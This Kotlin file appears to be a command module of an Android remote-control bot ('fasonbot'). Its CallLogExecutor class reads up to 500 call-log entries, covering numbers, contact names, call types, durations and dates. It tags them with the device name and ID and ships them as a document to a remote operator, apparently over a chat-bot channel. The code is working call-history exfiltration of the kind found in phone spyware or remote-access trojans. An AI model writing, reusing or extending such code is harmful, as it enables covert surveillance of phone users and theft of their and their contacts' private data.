package com.fasonbot.app.action

import android.content.Context
import android.provider.CallLog
import android.util.Log
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.util.PermissionHelper
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CallLogExecutor(context: Context) : BaseExecutor(context) {

    companion object {
        private const val TAG = "CallLogExecutor"
        private const val MAX_CALLS = 500
    }

    private val deviceId: String by lazy { DeviceManager.getDeviceId(context) }

    fun execute() {
        if (!PermissionHelper.hasReadCallLog(context)) {
            sendResponse("❌ <b>Permission Denied</b>\n\nCall log access not granted.", parseMode = "HTML")
            return
        }
        try {
            val content = StringBuilder()
            content.append("📞 CALL LOG\n")
            content.append("━━━━━━━━━━━━━━━━━━━━━━━━\n")
            content.append("📱 ${BotConfig.getDeviceName()}\n")
            content.append("🆔 $deviceId\n")
            content.append("━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            val dateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault())
            context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.CACHED_NAME
                ),
                null, null, "${CallLog.Calls.DATE} DESC"
            )?.use { cursor ->
                while (cursor.moveToNext() && count < MAX_CALLS) {
                    count++
                    val number = cursor.getString(0) ?: "Unknown"
                    val duration = cursor.getString(1) ?: "0"
                    val type = cursor.getString(2) ?: "0"
                    val date = cursor.getLong(3)
                    val name = cursor.getString(4) ?: "Unknown"
                    val typeIcon = when (type) {
                        "1" -> "📥"
                        "2" -> "📤"
                        "3" -> "📵"
                        "4" -> "🎙️"
                        "5" -> "❌"
                        "6" -> "🚫"
                        else -> "❓"
                    }
                    val typeStr = when (type) {
                        "1" -> "Incoming"
                        "2" -> "Outgoing"
                        "3" -> "Missed"
                        "4" -> "Voicemail"
                        "5" -> "Rejected"
                        "6" -> "Blocked"
                        else -> "Unknown"
                    }
                    val dateStr = try { dateFormat.format(Date(date)) } catch (_: Exception) { "Unknown" }
                    val durationMin = duration.toIntOrNull()?.let { "${it / 60}m ${it % 60}s" } ?: "${duration}s"
                    content.append("$typeIcon <b>$typeStr</b>\n")
                    content.append("👤 $name\n")
                    content.append("📞 $number\n")
                    content.append("⏱️ $durationMin • 📅 $dateStr\n")
                    content.append("────────────────────────\n")
                }
            }
            content.append("\n📊 Total: $count calls")
            sendFileAsDocument("CallLog_${BotConfig.getDeviceName()}", content.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Get call log error: ${e.message}")
            sendResponse("❌ <b>Error</b>\n\n${e.message}", parseMode = "HTML")
        }
    }

    private fun sendFileAsDocument(name: String, content: String) {
        var file: File? = null
        try {
            file = createTempFile(name, content)
            if (file != null) {
                sendDocument(file, caption = "📞 Call Log")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send file error: ${e.message}")
            sendResponse("❌ <b>Error</b>\n\n${e.message}", parseMode = "HTML")
        } finally {
            deleteTempFile(file)
        }
    }
}
